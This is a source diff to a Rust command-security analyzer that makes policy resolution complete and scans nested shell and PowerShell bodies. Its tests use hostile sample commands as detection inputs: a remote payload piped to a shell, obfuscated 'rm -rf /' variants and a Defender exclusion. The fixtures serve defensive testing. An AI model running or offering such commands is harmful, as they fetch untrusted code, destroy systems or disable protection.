 ) -> (Verdict, Policy) {
     let start = Instant::now();
 
-    // Runner enforcement must make every rule decision against one complete,
-    // immutable-in-this-call policy object. Resolve all overlays once up front,
-    // then thread that snapshot through the gate, rule pass, and return value.
-    // Ordinary analysis deliberately leaves this `None` and retains its partial
-    // tier-1 hot path.
+    // Every enforcement decision must use one complete, immutable-in-this-call
+    // policy object. In particular, a clean tier-1 command and `TIRITH=0` may not
+    // decide from local-only policy while an authenticated remote policy carries
+    // custom rules, guard settings, or a bypass prohibition. Resolve all overlays
+    // once and thread that exact snapshot through the gate, bypass decision, rule
+    // pass, and return value.
     let force_full_policy = force_full.then(|| discover_fully_resolved_policy(ctx));
     let effective_policy_snapshot = force_full_policy.as_ref().or(policy_snapshot);
 
@@ -1938,11 +2400,26 @@ fn analyze_inner_with_policy(
         false
     };
 
-    let regex_triggered = extract::tier1_scan(&ctx.input, ctx.scan_context);
+    let regex_triggered = extract::tier1_scan_for_shell(&ctx.input, ctx.scan_context, ctx.shell);
+
+    // Executable groups/wrappers are a Tier-1 boundary of their own. Dynamic or
+    // malformed bodies must reach the fail-closed Tier-3 rule, and a decoded
+    // body (notably PowerShell `-EncodedCommand`) may contain the only built-in
+    // risk signal even though the outer base64 spelling is otherwise clean.
+    let executable_body_triggered = if ctx.scan_context == ScanContext::Exec {
+        let stripped = crate::command_card::strip_card_comment_lines_cow(&ctx.input);
+        let (nested, incomplete) = collect_nested_executable_inputs(&stripped, ctx.shell);
+        incomplete
+            || nested.iter().any(|body| {
+                extract::tier1_scan_for_shell(&body.input, ctx.scan_context, body.shell)
+            })
+    } else {
+        false
+    };
 
     // Exec-only: catch bidi/zero-width/invisible bytes even with no URL.
-    // `tirith diff/score/why/receipt/explain` args are carved out (inspection
-    // targets) for the eight Unicode-style rule classes only.
+    // Proven-literal `tirith diff/score/why/receipt/explain` args are carved out
+    // (inspection targets) for the eight Unicode-style rule classes only.
     let inert_range = if ctx.scan_context == ScanContext::Exec {
         // Compute the carve-out from the prelude-STRIPPED command (CodeRabbit
         // R13c) — else a `# tirith-card:` line hides the `tirith <subcommand>`
@@ -1973,17 +2450,16 @@ fn analyze_inner_with_policy(
         false
     };
 
-    // The LOCAL partial policy, discovered ONCE for the gate + reused by every
-    // flag below and by the fast-exit's return value (single `discover_partial`).
-    // Exact-snapshot verification supplies the already-resolved full policy
-    // instead, so the gate and the later rule pass cannot observe different
-    // policy bytes. Only for Exec/Paste — FileScan never fast-exits.
-    let gate_partial: Option<Policy> =
+    // Resolve the EFFECTIVE policy once for the Exec/Paste gate. FileScan never
+    // fast-exits and resolves the same full policy below. A supplied snapshot is
+    // already fully resolved; otherwise this includes authenticated remote policy
+    // and every read-only overlay before any Allow or bypass can be returned.
+    let gate_policy: Option<Policy> =
         if matches!(ctx.scan_context, ScanContext::Exec | ScanContext::Paste) {
             Some(
                 effective_policy_snapshot
                     .cloned()
-                    .unwrap_or_else(|| Policy::discover_partial(ctx.cwd.as_deref())),
+                    .unwrap_or_else(|| discover_fully_resolved_policy(ctx)),
             )
         } else {
             None
@@ -1993,35 +2469,29 @@ fn analyze_inner_with_policy(
     // so force past the fast-exit when the opt-in `exec_guard_enabled` /
     // `hooks_guard_enabled` flag is set (Exec only). The hooks force is narrowed
     // to a hook-triggering leader so an arbitrary command still fast-exits.
-    let (exec_guard_triggered, hooks_guard_triggered) = match (ctx.scan_context, &gate_partial) {
-        (ScanContext::Exec, Some(partial)) => {
+    let (exec_guard_triggered, hooks_guard_triggered) = match (ctx.scan_context, &gate_policy) {
+        (ScanContext::Exec, Some(policy)) => {
             // Strip the `# tirith-card:` prelude first (the hook-leader predicate
             // keys off the real command, like the rule path's `analyzed_input`).
-            let hooks = partial.hooks_guard_enabled
+            let hooks = policy.hooks_guard_enabled
                 && leader_is_hook_triggering(
                     ctx,
                     &crate::command_card::strip_card_comment_lines_cow(&ctx.input),
                 );
-            (partial.exec_guard_enabled, hooks)
+            (policy.exec_guard_enabled, hooks)
         }
         _ => (false, false),
     };
 
-    // M13 — a custom-rule DSL `when:` clause keys on SEMANTIC facts tier-1 can't
-    // see (`command.cwd_in`, `package.*`, `url.*`, …), so force past the fast-exit
-    // when the policy carries a DSL rule whose clause (a) references a
-    // tier-1-invisible predicate, (b) would compile (not the dropped
-    // `agent.kind`/`mcp.tool`), AND (c) would RUN in THIS context (`scan_context`
-    // in the rule's `declared ∩ satisfiable` contexts). Without (c) a FILE-scoped
-    // rule would force every Exec/Paste command past the fast-exit. Cheap
-    // O(rules) clause-shape scan — no regex compile, no eval-context build.
-    let custom_dsl_triggered = match &gate_partial {
-        Some(partial) => crate::rules::custom::any_semantic_only_dsl_rules_for_context(
-            &partial.custom_rules,
-            ctx.scan_context,
-        ),
-        None => false,
-    };
+    // Every applicable custom rule is outside the built-in tier-1 pattern set.
+    // A regex-only organization rule can intentionally match an otherwise-clean
+    // command, just as a semantic DSL rule can. Never return Allow before the
+    // complete rule pass merely because the built-in coarse scan was clean.
+    let custom_rules_triggered = gate_policy.as_ref().is_some_and(|policy| {
+        crate::rules::custom::compile_rules(&policy.custom_rules)
+            .iter()
+            .any(|rule| rule.contexts.contains(&ctx.scan_context))
+    });
 
     // C3a — a custom `injection_seeds_custom` seed is a free regex with no
     // tier-1 PATTERN_TABLE coverage, so a pasted phrase sharing NO built-in
@@ -2031,7 +2501,7 @@ fn analyze_inner_with_policy(
     // Paste + output (the output path bypasses tier-1 entirely), never Exec, so
     // Exec needs no force-past here.
     let custom_seeds_triggered = ctx.scan_context == ScanContext::Paste
-        && gate_partial
+        && gate_policy
             .as_ref()
             .is_some_and(|p| !p.injection_seeds_custom.is_empty());
 
@@ -2092,8 +2562,13 @@ fn analyze_inner_with_policy(
     let tier1_ms = tier1_start.elapsed().as_secs_f64() * 1000.0;
 
     if !force_full
+        // An explicit bypass request is security-relevant evidence even when
+        // the command itself is tier-1 clean. Let the resolved-policy branch
+        // below record whether that request was available and honored.
+        && !bypass_requested
         && !byte_scan_triggered
         && !regex_triggered
+        && !executable_body_triggered
         && !exec_bidi_triggered
         && !exec_guard_triggered
         && !hooks_guard_triggered
@@ -2102,7 +2577,7 @@ fn analyze_inner_with_policy(
         && !card_triggered
         && !manifest_triggered
         && !paste_source_triggered
-        && !custom_dsl_triggered
+        && !custom_rules_triggered
         && !custom_seeds_triggered
         && !deobf_candidate_triggered
     {
@@ -2118,16 +2593,9 @@ fn analyze_inner_with_policy(
                     total_ms,
                 },
             ),
-            // Reuse the gate policy (the supplied exact snapshot during
-            // safe-command verification, otherwise the local partial). FileScan
-            // never reaches this fast-exit, so the `None` branch is a fallback.
-            //
-            // Normal analysis BY DESIGN returns the PARTIAL, not fully-resolved,
-            // policy (CodeRabbit M13 PR #132). On the ALLOW path the verdict has
-            // zero findings, so the omitted remote/user/org/trust overlays are
-            // irrelevant to its existing callers. Snapshot verification already
-            // owns the fully-resolved policy and returns its clone here.
-            gate_partial.unwrap_or_else(|| Policy::discover_partial(ctx.cwd.as_deref())),
+            // FileScan never reaches this fast exit. Keep the fallback defensive,
+            // but never substitute a local-only policy for an enforcement result.
+            gate_policy.unwrap_or_else(|| discover_fully_resolved_policy(ctx)),
         );
     }
 
@@ -2136,7 +2604,8 @@ fn analyze_inner_with_policy(
     if bypass_requested {
         let policy = effective_policy_snapshot
             .cloned()
-            .unwrap_or_else(|| Policy::discover_partial(ctx.cwd.as_deref()));
+            .or_else(|| gate_policy.clone())
+            .unwrap_or_else(|| discover_fully_resolved_policy(ctx));
         let allow_bypass = if ctx.interactive {
             policy.allow_bypass_env
         } else {
@@ -2157,6 +2626,11 @@ fn analyze_inner_with_policy(
                 },
             );
             verdict.bypass_requested = true;
+            // `allow_bypass` is the exact resolved policy fact that authorized
+            // this fast return. Preserve it on the verdict so proof-carrying
+            // execution drafts can validate an honored bypass instead of
+            // treating the fast path as internally inconsistent.
+            verdict.bypass_available = true;
             verdict.bypass_honored = true;
             verdict.interactive_detected = ctx.interactive;
             verdict.policy_path_used = policy.path.clone();
@@ -2168,11 +2642,10 @@ fn analyze_inner_with_policy(
         }
     }
 
-    let policy = if let Some(snapshot) = effective_policy_snapshot {
-        snapshot.clone()
-    } else {
-        discover_fully_resolved_policy(ctx)
-    };
+    let policy = effective_policy_snapshot
+        .cloned()
+        .or(gate_policy)
+        .unwrap_or_else(|| discover_fully_resolved_policy(ctx));
 
     // Fail-open: None when the DB is unavailable.
     let threat_db: Option<std::sync::Arc<crate::threatdb::ThreatDb>> =
@@ -2296,6 +2769,17 @@ fn analyze_inner_with_policy(
         // over a repo would false-flag docs quoting injection phrases. `tirith
         // logs scan` calls it explicitly (cli/logs.rs); Paste/output stay wired.
     } else {
+        let (nested_executable_inputs, nested_execution_incomplete) =
+            collect_nested_executable_inputs(&analyzed_input, ctx.shell);
+        let root_execution_view = crate::extract::shell_execution_view(&analyzed_input, ctx.shell);
+        let executable_inputs = || {
+            std::iter::once((root_execution_view.as_ref(), ctx.shell)).chain(
+                nested_executable_inputs
+                    .iter()
+                    .map(|body| (body.input.as_str(), body.shell)),
+            )
+        };
+
         if ctx.scan_context == ScanContext::Paste {
             if let Some(ref bytes) = ctx.raw_bytes {
                 let byte_findings = crate::rules::terminal::check_bytes(bytes);
@@ -2415,43 +2899,68 @@ fn analyze_inner_with_policy(
         );
         findings.extend(command_findings);
 
-        // PowerShell-specific rules (M5 item 16), PowerShell input only. See
-        // `rules::powershell` for the boundary with `pipe_to_interpreter`.
-        if ctx.shell == ShellType::PowerShell {
-            let ps_findings = crate::rules::powershell::check(&analyzed_input, ctx.shell);
-            findings.extend(ps_findings);
-        }
+        // PowerShell-specific rules (M5 item 16). The checker follows
+        // shell-tagged wrapper bodies, so a POSIX/Cmd outer command cannot hide
+        // a PowerShell `-Command`/`-EncodedCommand` body.
+        let ps_findings = crate::rules::powershell::check(&analyzed_input, ctx.shell);
+        findings.extend(ps_findings);
 
         // Install-command rules (unsigned repos, disabled GPG, remote manifests).
         // Pure pattern detection, no network on the hot path.
-        let install_findings = crate::rules::install::check(&analyzed_input, ctx.shell);
-        findings.extend(install_findings);
+        for (executable_input, executable_shell) in executable_inputs() {
+            findings.extend(crate::rules::install::check(
+                executable_input,
+                executable_shell,
+            ));
+        }
 
         // M8 — operational-context rules, Exec only (FileScan returned above).
         // Each short-circuits cheaply when its labels/leader don't apply.
         if ctx.scan_context == ScanContext::Exec {
             // ch1 — context (behind `context_guard_enabled`).
-            let context_findings =
-                crate::rules::context::check(&analyzed_input, ctx.shell, &policy);
-            findings.extend(context_findings);
+            for (executable_input, executable_shell) in executable_inputs() {
+                findings.extend(crate::rules::context::check(
+                    executable_input,
+                    executable_shell,
+                    &policy,
+                ));
+            }
 
             // ch2 — SSH context (empty-labels fast path inside `ssh_context::check`).
-            let ssh_findings =
-                crate::rules::ssh_context::check(&analyzed_input, ctx.shell, &policy);
-            findings.extend(ssh_findings);
+            for (executable_input, executable_shell) in executable_inputs() {
+                findings.extend(crate::rules::ssh_context::check(
+                    executable_input,
+                    executable_shell,
+                    &policy,
+                ));
+            }
 
             // ch3 — IaC (tier-1 gate: `iac_cmd`).
-            let iac_findings = crate::rules::iac::check(&analyzed_input, ctx.shell, &policy);
-            findings.extend(iac_findings);
+            for (executable_input, executable_shell) in executable_inputs() {
+                findings.extend(crate::rules::iac::check(
+                    executable_input,
+                    executable_shell,
+                    &policy,
+                ));
+            }
 
             // ch4 — sudo-escalation (tier-1 gate: `sudo_cmd`; lazy session lookup).
-            let sudo_findings = crate::rules::sudo::check(&analyzed_input, ctx.shell, &policy);
-            findings.extend(sudo_findings);
+            for (executable_input, executable_shell) in executable_inputs() {
+                findings.extend(crate::rules::sudo::check(
+                    executable_input,
+                    executable_shell,
+                    &policy,
+                ));
+            }
 
             // ch5 — container-runtime (tier-1 gates: `docker_command`, `docker_exec`).
-            let container_findings =
-                crate::rules::container::check(&analyzed_input, ctx.shell, &policy);
-            findings.extend(container_findings);
+            for (executable_input, executable_shell) in executable_inputs() {
+                findings.extend(crate::rules::container::check(
+                    executable_input,
+                    executable_shell,
+                    &policy,
+                ));
+            }
 
             // M9 ch4 — env-var lifecycle guard (opt-in `env_guard_enabled`):
             // EnvSensitiveExposedToUnknownScript (High; the set-sensitive-var
@@ -2462,17 +2971,20 @@ fn analyze_inner_with_policy(
                 let sensitive =
                     crate::env_guard::effective_sensitive_vars(&policy.env_guard_sensitive_vars);
                 let set_sensitive = crate::env_guard::sensitive_env_set_in_process(&sensitive);
-                if let Some(f) = crate::env_guard::check_sensitive_exposed_to_unknown_script(
-                    &analyzed_input,
-                    ctx.shell,
-                    &set_sensitive,
-                ) {
-                    findings.push(f);
-                }
-                if let Some(f) =
-                    crate::env_guard::check_printenv_to_network_sink(&analyzed_input, ctx.shell)
-                {
-                    findings.push(f);
+                for (executable_input, executable_shell) in executable_inputs() {
+                    if let Some(f) = crate::env_guard::check_sensitive_exposed_to_unknown_script(
+                        executable_input,
+                        executable_shell,
+                        &set_sensitive,
+                    ) {
+                        findings.push(f);
+                    }
+                    if let Some(f) = crate::env_guard::check_printenv_to_network_sink(
+                        executable_input,
+                        executable_shell,
+                    ) {
+                        findings.push(f);
+                    }
                 }
             }
 
@@ -2480,7 +2992,35 @@ fn analyze_inner_with_policy(
             // `exec_guard_enabled`). See `check_exec_provenance_hot` + the
             // `analyze` doc for the hot/cold split.
             if policy.exec_guard_enabled {
-                findings.extend(check_exec_provenance_hot(ctx, &analyzed_input));
+                for (executable_input, executable_shell) in executable_inputs() {
+                    findings.extend(check_exec_provenance_hot(
+                        ctx,
+                        executable_input,
+                        executable_shell,
+                    ));
+                }
+                if nested_execution_incomplete {
+                    findings.push(Finding {
+                        rule_id: crate::verdict::RuleId::AnalysisIncomplete,
+                        severity: crate::verdict::Severity::High,
+                        title: "Nested executable provenance could not be resolved".to_string(),
+                        description: "The command executes a dynamic, invalid, or over-deep \
+                                      nested shell body while the executable-provenance guard is \
+                                      enabled. Tirith blocks instead of treating the outer \
+                                      executable as authoritative."
+                            .to_string(),
+                        evidence: vec![crate::verdict::Evidence::CommandPattern {
+                            pattern: "unresolved nested executable body".to_string(),
+                            matched: crate::redact::redact_shell_assignments(
+                                analyzed_input.as_ref(),
+                            ),
+                        }],
+                        human_view: None,
+                        agent_view: None,
+                        mitre_id: None,
+                        custom_rule_id: None,
+                    });
+                }
             }
 
             // M9 ch6 — repo-hook guard HOT subset (opt-in `hooks_guard_enabled`).
@@ -2557,13 +3097,14 @@ fn analyze_inner_with_policy(
         findings.extend(env_findings);
 
         if !policy.network_deny.is_empty() {
-            let net_findings = crate::rules::command::check_network_policy(
-                &analyzed_input,
-                ctx.shell,
-                &policy.network_deny,
-                &policy.network_allow,
-            );
-            findings.extend(net_findings);
+            for (executable_input, executable_shell) in executable_inputs() {
+                findings.extend(crate::rules::command::check_network_policy(
+                    executable_input,
+                    executable_shell,
+                    &policy.network_deny,
+                    &policy.network_allow,
+                ));
+            }
         }
 
         // M11 ch2 — repo command manifest (`.tirith/commands.yaml`).
@@ -2583,8 +3124,23 @@ fn analyze_inner_with_policy(
         let compiled = crate::rules::custom::compile_rules(&policy.custom_rules);
         // `analyzed_input` is prelude-stripped (Exec) / verbatim (Paste/FileScan),
         // so custom regex rules match the real command, not the card wrapper.
-        let custom_findings =
+        let mut custom_findings =
             crate::rules::custom::check(&analyzed_input, ctx.scan_context, &compiled);
+        if ctx.scan_context != ScanContext::FileScan {
+            let (nested, _) = collect_nested_executable_inputs(&analyzed_input, ctx.shell);
+            for body in nested {
+                custom_findings.extend(crate::rules::custom::check(
+                    &body.input,
+                    ctx.scan_context,
+                    &compiled,
+                ));
+            }
+            // A non-anchored rule may match both the outer spelling and its
+            // recovered body. A custom rule is invocation-scoped, so surface it
+            // once while still allowing anchored rules to match the inner body.
+            let mut seen = std::collections::HashSet::new();
+            custom_findings.retain(|finding| seen.insert(finding.custom_rule_id.clone()));
+        }
         findings.extend(custom_findings);
 
         // M13 ch4 — semantic-predicate (`when:`) rules. Build the eval context only
@@ -3303,15 +3859,11 @@ mod tests {
         );
     }
 
-    // ── Tier-1 gating guard for SEMANTIC-only custom DSL rules (CodeRabbit M13 PR
-    // #132) ───────────────────────────────────────────────────────────────────
-    // A DSL `when:` clause keying only on semantic facts tier-1 can't see
-    // (`command.cwd_in`, `package.*`, …) would be silently SKIPPED — the
-    // dotfile-overwrite gating bug class. `any_semantic_only_dsl_rules` forces past
-    // the fast-exit. Tests use a benign `whoami` (not `sudo …`, which trips
-    // `sudo_cmd` and proves nothing) and first assert the input fast-exits without
-    // the rule, so the tier-3 reach is attributable to the gate. They skip when
-    // `TIRITH_POLICY_ROOT` is set (it wins over cwd discovery).
+    // ── Tier-1 gating guard for effective custom rules ────────────────────────
+    // A custom regex or DSL clause can intentionally match facts the built-in
+    // tier-1 table cannot see. Every applicable compiled rule therefore forces
+    // the full rule pass. Tests use benign `whoami` controls so tier-3 reach is
+    // attributable to policy rather than a built-in pattern.
 
     /// Write `.tirith/policy.yaml` (+ `.git` marker) under `dir`.
     fn write_custom_rules_policy(dir: &std::path::Path, yaml: &str) {
@@ -3331,8 +3883,8 @@ mod tests {
     }
 
     /// THE GATING GUARD. A semantic-only DSL rule must FIRE on tier-1-clean input
-    /// that would otherwise fast-exit; `custom_dsl_triggered` keeps the analysis
-    /// alive to tier 3 (the DSL analogue of the dotfile-overwrite bug). Uses
+    /// that would otherwise fast-exit; the compiled custom-rule gate keeps the
+    /// analysis alive to tier 3 (the DSL analogue of the dotfile-overwrite bug). Uses
     /// `command.cwd_in` + a benign `whoami` (no tier-1 fragment), with a
     /// precondition asserting the same input fast-exits without the rule.
     #[test]
@@ -3878,12 +4430,12 @@ mod tests {
         );
     }
 
-    /// NEGATIVE / PERF guard: the gate must NOT force-run when there's nothing to
-    /// run. Benign `whoami` must still fast-exit with (a) no custom rules, (b) a
-    /// regex-only rule (not a semantic DSL rule), and (c) an `agent.kind`-only DSL
-    /// rule (always dropped by `compile_rules`).
+    /// Effective custom rules are enforcement inputs even when built-in tier 1
+    /// is clean. With no rules the hot exit remains available; a valid regex rule
+    /// forces evaluation, while a dead rule dropped by the shared compiler does
+    /// not impose work or create a false finding.
     #[test]
-    fn no_semantic_dsl_rule_benign_input_still_fast_exits() {
+    fn effective_custom_rules_gate_the_tier1_fast_exit() {
         if std::env::var_os("TIRITH_POLICY_ROOT").is_some() {
             return;
         }
@@ -3900,8 +4452,8 @@ mod tests {
             v_bare.tier_reached
         );
 
-        // (b) A REGEX-only custom rule (no `when:`). Not a semantic DSL rule, so
-        // the gate must not force continuation; the input is still tier-1-clean.
+        // (b) A REGEX-only custom rule must be evaluated even though this input
+        // does not match it and the built-in tier-1 scan is otherwise clean.
         let regex_dir = tempfile::tempdir().unwrap();
         write_custom_rules_policy(
             regex_dir.path(),
@@ -3913,10 +4465,15 @@ mod tests {
              context: [exec]\n",
         );
         let v_regex = analyze(&exec_ctx_in(input, regex_dir.path()));
-        assert_eq!(
-            v_regex.tier_reached, 1,
-            "a regex-only custom rule must NOT force past the fast-exit; got tier {}",
+        assert!(
+            v_regex.tier_reached >= 3,
+            "an applicable regex custom rule must force the complete rule pass; got tier {}",
             v_regex.tier_reached
+        );
+        assert!(
+            v_regex.findings.is_empty(),
+            "an unmatched custom rule must preserve the clean control: {:?}",
+            v_regex.findings
         );
 
         // (c) A DSL rule whose only predicate is the unsupported `agent.kind` — a
@@ -3942,11 +4499,69 @@ mod tests {
         );
     }
 
-    /// Runner enforcement cannot inherit the public hot path's tier-1 shortcut:
-    /// a regex-only custom rule is intentionally NOT a force-past signal for
-    /// ordinary analysis, but it must still be evaluated before execution. The
-    /// runner entry point must also return the effective policy with the separate
-    /// read-only overlays loaded, rather than the partial gate policy.
+    #[test]
+    fn custom_regex_and_dsl_rules_receive_nested_executable_bodies() {
+        if std::env::var_os("TIRITH_POLICY_ROOT").is_some() {
+            return;
+        }
+        let _state = isolate_state();
+        use crate::verdict::RuleId;
+
+        let regex_dir = tempfile::tempdir().unwrap();
+        write_custom_rules_policy(
+            regex_dir.path(),
+            "custom_rules:\n  \
+             - id: nested-exact\n    \
+             pattern: '^danger-inner$'\n    \
+             severity: high\n    \
+             title: \"nested exact command\"\n    \
+             context: [exec]\n",
+        );
+        let regex_verdict = analyze(&exec_ctx_in("sh -c 'danger-inner'", regex_dir.path()));
+        assert!(
+            regex_verdict.findings.iter().any(|finding| {
+                finding.rule_id == RuleId::CustomRuleMatch
+                    && finding.custom_rule_id.as_deref() == Some("nested-exact")
+            }),
+            "anchored nested regex escaped: {:?}",
+            regex_verdict.findings
+        );
+
+        let dsl_dir = tempfile::tempdir().unwrap();
+        write_custom_rules_policy(
+            dsl_dir.path(),
+            "custom_rules:\n  \
+             - id: nested-sudo\n    \
+             when:\n      \
+             command.uses_sudo: true\n    \
+             severity: high\n    \
+             title: \"nested sudo\"\n    \
+             context: [exec]\n",
+        );
+        for input in ["echo $(sudo id)", "sh -c 'sudo id'"] {
+            let verdict = analyze(&exec_ctx_in(input, dsl_dir.path()));
+            assert!(
+                verdict.findings.iter().any(|finding| {
+                    finding.rule_id == RuleId::CustomRuleMatch
+                        && finding.custom_rule_id.as_deref() == Some("nested-sudo")
+                }),
+                "nested DSL fact escaped: {input} -> {:?}",
+                verdict.findings
+            );
+        }
+
+        let mut dormant = exec_ctx_in("$block = { sudo id }", dsl_dir.path());
+        dormant.shell = ShellType::PowerShell;
+        let dormant_verdict = analyze(&dormant);
+        assert!(dormant_verdict
+            .findings
+            .iter()
+            .all(|finding| { finding.custom_rule_id.as_deref() != Some("nested-sudo") }));
+    }
+
+    /// Ordinary and runner enforcement both evaluate regex-only custom rules on
+    /// a built-in-tier-1-clean command. The runner entry point must also return
+    /// the effective policy with the separate read-only overlays loaded.
     #[test]
     fn force_full_runner_evaluates_regex_rule_and_returns_effective_policy() {
         let _state = isolate_state();
@@ -3996,19 +4611,16 @@ mod tests {
 
         let ctx = exec_ctx_in("whoami", dir.path());
 
-        // Public analysis keeps its latency contract: a regex-only custom rule
-        // does not defeat the tier-1 fast exit on otherwise-clean input.
+        // Public enforcement must not skip a policy rule just because built-in
+        // tier 1 considers the command clean.
         let ordinary = analyze(&ctx);
-        assert_eq!(
-            ordinary.tier_reached, 1,
-            "ordinary analysis must retain the tier-1 fast exit"
-        );
+        assert!(ordinary.tier_reached >= 3);
         assert!(
-            !ordinary.findings.iter().any(|finding| {
+            ordinary.findings.iter().any(|finding| {
                 finding.rule_id == RuleId::CustomRuleMatch
                     && finding.custom_rule_id.as_deref() == Some("runner-regex")
             }),
-            "the regex-only rule must remain unevaluated on the ordinary fast path"
+            "ordinary enforcement must evaluate the effective regex-only rule"
         );
 
         // The partial policy deliberately omits the flat-list and label overlays;
@@ -4540,6 +5152,292 @@ mod tests {
         }
     }
 
+    #[test]
+    fn nested_executable_bodies_reach_sudo_and_install_controls() {
+        let policy = Policy::default();
+
+        let mut powershell_sudo = exec_ctx("& { sudo -i }");
+        powershell_sudo.shell = ShellType::PowerShell;
+        let sudo_verdict =
+            analyze_inner_with_policy(&powershell_sudo, false, Some(&policy), true).0;
+        assert!(sudo_verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == crate::verdict::RuleId::SudoShellSpawn));
+
+        let posix_sudo = exec_ctx("echo $(sudo -i)");
+        let posix_verdict = analyze_inner_with_policy(&posix_sudo, false, Some(&policy), true).0;
+        assert!(posix_verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == crate::verdict::RuleId::SudoShellSpawn));
+
+        let mut powershell_install =
+            exec_ctx("& { kubectl apply -f https://example.test/deploy.yaml }");
+        powershell_install.shell = ShellType::PowerShell;
+        let install_verdict =
+            analyze_inner_with_policy(&powershell_install, false, Some(&policy), true).0;
+        assert!(install_verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == crate::verdict::RuleId::KubectlApplyRemote));
+    }
+
+    #[test]
+    fn dormant_powershell_scriptblock_does_not_reach_nested_controls() {
+        let policy = Policy::default();
+        let mut ctx =
+            exec_ctx("$block = { sudo -i; kubectl apply -f https://example.test/deploy.yaml }");
+        ctx.shell = ShellType::PowerShell;
+        let verdict = analyze_inner_with_policy(&ctx, false, Some(&policy), true).0;
+        assert!(verdict.findings.iter().all(|finding| {
+            !matches!(
+                finding.rule_id,
+                crate::verdict::RuleId::SudoShellSpawn | crate::verdict::RuleId::KubectlApplyRemote
+            )
+        }));
+    }
+
+    #[test]
+    fn overdeep_powershell_execution_group_blocks_as_incomplete() {
+        let policy = Policy::default();
+        let input = format!(
+            "{}sudo -i{}",
+            "& { ".repeat(MAX_EXECUTABLE_BODY_DEPTH + 2),
+            " }".repeat(MAX_EXECUTABLE_BODY_DEPTH + 2),
+        );
+        let mut ctx = exec_ctx(&input);
+        ctx.shell = ShellType::PowerShell;
+        let verdict = analyze_inner_with_policy(&ctx, false, Some(&policy), true).0;
+        assert!(verdict.findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                && finding.severity == crate::verdict::Severity::High
+        }));
+    }
+
+    #[test]
+    fn shell_wrapper_bodies_reach_child_shell_controls() {
+        let policy = Policy::default();
+
+        let sudo = exec_ctx("sh -c 'sudo -i'");
+        let sudo_verdict = analyze_inner_with_policy(&sudo, false, Some(&policy), true).0;
+        assert!(sudo_verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == crate::verdict::RuleId::SudoShellSpawn));
+
+        let defender = exec_ctx("pwsh -Command 'Add-MpPreference -ExclusionPath C:\\Temp'");
+        let defender_verdict = analyze_inner_with_policy(&defender, false, Some(&policy), true).0;
+        assert!(defender_verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == crate::verdict::RuleId::PsDefenderExclusion));
+
+        let mut cmd = exec_ctx(r#"cmd /C "curl http://wrapper.example/payload | sh""#);
+        cmd.shell = ShellType::Cmd;
+        let cmd_verdict = analyze_inner_with_policy(&cmd, false, Some(&policy), true).0;
+        assert!(cmd_verdict.findings.iter().any(|finding| matches!(
+            finding.rule_id,
+            crate::verdict::RuleId::PlainHttpToSink
+                | crate::verdict::RuleId::CurlPipeShell
+                | crate::verdict::RuleId::PipeToInterpreter
+        )));
+    }
+
+    #[test]
+    fn dynamic_executable_bodies_force_tier3_and_fail_closed() {
+        let _state = isolate_state();
+        for (input, shell) in [
+            (r#"sh -c "$COMMAND""#, ShellType::Posix),
+            ("& $command", ShellType::PowerShell),
+            ("cmd /C %COMMAND%", ShellType::Cmd),
+            ("echo $(whoami", ShellType::Posix),
+            ("(echo safe", ShellType::Cmd),
+            ("powershell -EncodedCommand not-base64!", ShellType::Cmd),
+            ("$(printf rm) -rf /", ShellType::Posix),
+            ("${UNSET:-rm} -rf /", ShellType::Posix),
+            ("{rm,-rf,/}", ShellType::Posix),
+            ("bash <(printf '%s\\n' 'rm -rf /')", ShellType::Posix),
+            ("source <(printf '%s\\n' 'rm -rf /')", ShellType::Posix),
+            ("Invoke-Command -ScriptBlock $block", ShellType::PowerShell),
+            ("$block.Invoke()", ShellType::PowerShell),
+            (
+                "$block.InvokeWithContext($null, @(), @())",
+                ShellType::PowerShell,
+            ),
+        ] {
+            let mut ctx = exec_ctx(input);
+            ctx.shell = shell;
+            let verdict = analyze(&ctx);
+            assert!(
+                verdict.tier_reached >= 3,
+                "dynamic body fast-exited before enforcement: {input}"
+            );
+            assert!(
+                verdict.findings.iter().any(|finding| {
+                    finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                        && finding.severity == crate::verdict::Severity::High
+                }),
+                "dynamic body did not fail closed: {input} -> {:?}",
+                verdict.findings
+            );
+        }
+
+        let mut heredoc_ctx = exec_ctx("cat <<'EOF'\n' quote-like data\nEOF\nrm -rf /");
+        heredoc_ctx.shell = ShellType::Posix;
+        let heredoc_verdict = analyze(&heredoc_ctx);
+        assert_eq!(
+            heredoc_verdict
+                .findings
+                .iter()
+                .filter(|finding| {
+                    finding.rule_id == crate::verdict::RuleId::BlastWritesSystemPath
+                })
+                .count(),
+            1
+        );
+        assert!(heredoc_verdict
+            .findings
+            .iter()
+            .all(|finding| { finding.rule_id != crate::verdict::RuleId::AnalysisIncomplete }));
+
+        let dormant_function = "danger() {\ncat <<'EOF'\ndata\nEOF\nrm -rf /\n}";
+        let dormant_verdict = analyze(&exec_ctx(dormant_function));
+        assert!(dormant_verdict
+            .findings
+            .iter()
+            .all(|finding| { finding.rule_id != crate::verdict::RuleId::BlastWritesSystemPath }));
+
+        let invoked_verdict = analyze(&exec_ctx(&format!("{dormant_function}\ndanger")));
+        assert_eq!(
+            invoked_verdict
+                .findings
+                .iter()
+                .filter(|finding| {
+                    finding.rule_id == crate::verdict::RuleId::BlastWritesSystemPath
+                })
+                .count(),
+            1
+        );
+
+        let nested_verdict = analyze(&exec_ctx("sh -c 'rm -rf /'"));
+        assert_eq!(
+            nested_verdict
+                .findings
+                .iter()
+                .filter(|finding| {
+                    finding.rule_id == crate::verdict::RuleId::BlastWritesSystemPath
+                })
+                .count(),
+            1
+        );
+
+        for (input, shell) in [
+            ("sh -c 'echo safe'", ShellType::Posix),
+            ("& { Write-Output safe }", ShellType::PowerShell),
+            (
+                "$block = { Add-MpPreference -ExclusionPath C:\\Temp }",
+                ShellType::PowerShell,
+            ),
+        ] {
+            let mut ctx = exec_ctx(input);
+            ctx.shell = shell;
+            let verdict = analyze_inner_with_policy(&ctx, false, Some(&Policy::default()), true).0;
+            assert!(
+                verdict.findings.iter().all(|finding| {
+                    finding.rule_id != crate::verdict::RuleId::AnalysisIncomplete
+                }),
+                "literal/benign body became ambiguous: {input} -> {:?}",
+                verdict.findings
+            );
+        }
+    }
+
+    #[test]
